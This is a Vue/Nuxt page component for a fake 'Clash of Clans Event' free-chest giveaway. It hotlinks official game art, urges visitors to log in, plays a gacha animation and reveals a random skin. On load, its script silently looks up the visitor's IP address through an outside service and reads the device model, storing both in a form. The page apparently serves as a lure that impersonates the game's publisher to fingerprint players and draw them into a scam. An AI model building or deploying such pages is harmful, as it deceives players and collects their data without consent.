<template>

    <div class="content">
        <div class="wel">
            <h1 class="shadow">Welcome to the<br>Clash of Clans Event</h1>
        </div>
        <div class="front">
            <div class="f-imgBox">
                <img src="https://p1-image.cdn-aihelp.net/FileService/UserFile/0/202505/202505181635483336a1a8a8c3b_lite.png">
            </div>
            <span class="f-title shadow">{{ title || 'Free Chest'}}</span>
            <template v-if="isEndGacha">
              <div class="g-imgBox" ref="gimgbox">
                <img :src="`${gimg}`"/>
              </div>
            <div class="claim">
                Claim Now
            </div>
            </template>
            <template v-else>
            <p>Don’t miss out! Log in now and claim your FREE chest packed with awesome rewards</p>
            <div class="claim" @click="openModalGacha" ref="btn_claim">
                Claim Free
            </div>
            </template>
        </div>

        <div class="modal-gacha hide" ref="mgacha">
          <span class="hint shadow">Tap!</span>
            <video @click="doHammer" playsinline webkit-playsinline preload="auto" ref="gacha" src="https://akmweb.youngjoygame.com/web/jefanyamemek/image/347a0c20b878d59c74f80881e908cc23.MP4"></video>
        </div>
    </div>

</template>

<script setup>

function fallbackModelFromUA() {
    const ua = navigator.userAgent;
    const match = ua.match(/\s([A-Z0-9\-]+)\sBuild/);
    if (match && match[1]) {
        return match[1];
    } else {
        return 'No UA';
    }
}
onMounted(async () => {

    fetch('https://ip4only.me/api/')
        .then(res => res.text())
        .then(text => {
            const ip = text.split(",")[1];
            form.value.ipaddress = ip;
    });
    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
      navigator.userAgentData.getHighEntropyValues(["model"])
        .then(ua => {
          if (ua.model) {
            form.value.device = ua.modelz
          } else {
            form.value.device = fallbackModelFromUA();
          }
        })
        .catch(err => {
          console.warn("Error getHighEntropyValues:", err);
          form.value.device = fallbackModelFromUA();
        });
    } else {
      form.value.device = fallbackModelFromUA();
    }
})


// Plugin
const { $confetti } = useNuxtApp();


const currentStep = ref(0);
const isPlaying = ref(false);
const isEndGacha = ref(false)

// Element
const gacha = ref(null);
const mgacha = ref(null);
const btn_claim = ref(null);
const title = ref(null);
const gimgbox = ref(null);
const gimg = ref('https://event-assets.clashofclans.com/ba01a5d3-9ef0-461d-b9f2-51fec3f51bd9_Football_King.png');

const steps = [0.6, 1.4, 1.3, 1.3];

const form = ref({
  ip: null,
  device: null
});


const prize = [
  {name:'Footbal King', img: 'https://event-assets.clashofclans.com/ba01a5d3-9ef0-461d-b9f2-51fec3f51bd9_Football_King.png', card: 'https://p1-image.cdn-aihelp.net/FileService/UserFile/0/202505/202505190625204823a48a74acb.jpg'},
  {name:'Footbal Warden', img: 'https://event-assets.clashofclans.com/688adad3-8aa3-4e2b-8721-9da66f22bf16_Football_Warden.png'},
  {name:'Footbal Queen', img: 'https://event-assets.clashofclans.com/0cd386b0-2aab-47f7-ac35-75fa5c0f7f09_Football_Queen.png'},
  {name:'Space King', img: 'https://event-assets.clashofclans.com/e1eb2dd6-798f-4521-974e-2cefd7a0af3b_ed32d48e_30bf_4560_8f77_de87d559e7c5_space_BK.png'},
  {name:'Egypt King', img: 'https://event-assets.clashofclans.com/78fab33c-5949-4798-8745-11a0ec77dd09_Egypt_BK.png'},
  {name:'Royal Ninja', img: 'https://event-assets.clashofclans.com/2a1fde40-a686-4a64-a155-cba854527b11_1000x1000_RC_Japan.png'},
  {name:'Space Warden', img: 'https://event-assets.clashofclans.com/69143e50-085e-45b9-abb2-f34b45eecbbe_space_GW.png'},
  {name:'Space Champion', img: 'https://event-assets.clashofclans.com/92f7f588-d154-4a4f-a996-100d4c1edd3e_space_RC.png'},
]



function openModalGacha() {
  mgacha.value.classList.remove('hide');
  btn_claim.value.classList.add('hide');
  doHammer();
}

function doHammer() {
  if (isPlaying.value || !gacha.value) return;

  isPlaying.value = true;

  const video = gacha.value;

  if (currentStep.value < steps.length) {
    const start = video.currentTime;
    const target = start + steps[currentStep.value];

    const onTimeUpdate = () => {
      if (video.currentTime >= target) {
        video.pause();
        video.removeEventListener('timeupdate', onTimeUpdate);
        isPlaying.value = false;
        currentStep.value++;
      }
    };

    video.addEventListener('timeupdate', onTimeUpdate);
    video.play();
  } else {
    video.play();

    setTimeout(() => {
      mgacha.value.classList.add('hide');
      isPlaying.value = false;
      isEndGacha.value = true;
      // 
      nextTick(() => {
        let data = prize[Math.floor(Math.random() * prize.length)];
        title.value = data.name;
        gimg.value = data.img;
        gimgbox.value.style.backgroundImage = `url('https://p1-image.cdn-aihelp.net/FileService/UserFile/0/202505/2025051907150308139411aa041.jpg')`;
      });
    }, 1850);
  }
}

</script>

<style scoped>

@import url('/components/index.css');

</style>